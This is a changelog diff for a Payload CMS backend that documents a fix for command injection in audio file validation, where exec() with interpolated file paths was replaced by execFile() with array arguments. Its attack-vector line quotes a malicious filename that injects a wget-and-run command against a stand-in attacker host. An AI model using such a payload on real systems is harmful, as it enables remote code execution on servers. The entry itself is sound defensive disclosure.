@@ -17,6 +17,21 @@ This changelog documents all significant changes to the Payload CMS backend serv
 
 ---
 
+## [2025-12-09] - Security: Fix Command Injection Vulnerability in Audio Validation
+
+### Security
+- **Audio Validation Command Injection Fix** – Fixed critical command injection vulnerability in audio file validation by replacing `exec()` with string interpolation with `execFile()` using array arguments. Location: `src/utils/audioValidation.ts`
+  - **Vulnerability**: The `getAudioMetadata()` function used `exec()` with string interpolation: `` `ffprobe ... "${filePath}"` ``, allowing malicious file paths to execute arbitrary shell commands
+  - **Attack Vector**: An attacker could upload a file with a malicious filename containing shell metacharacters (e.g., `file.mp3"; wget http://attacker.com/script.sh; sh script.sh; echo "`) that would execute when the file was validated
+  - **Fix Applied**: Replaced `exec()` with `execFile()` and passed arguments as an array instead of string interpolation
+  - **Impact**: File paths are now treated as literal arguments, preventing shell command injection even if filenames contain malicious characters
+  - **Pattern**: Matches the secure pattern already used in `deterministicFeed.ts` (uses `execFileAsync` with array arguments)
+
+### Fixed
+- **Command Injection in Audio Validation** – Fixed command injection vulnerability that allowed malicious file paths to execute shell commands during audio file validation
+
+---
+
 ## [2025-12-08] - Fix: LibreTime Authentication & Planner Rate Limit Handling
 
 ### Fixed
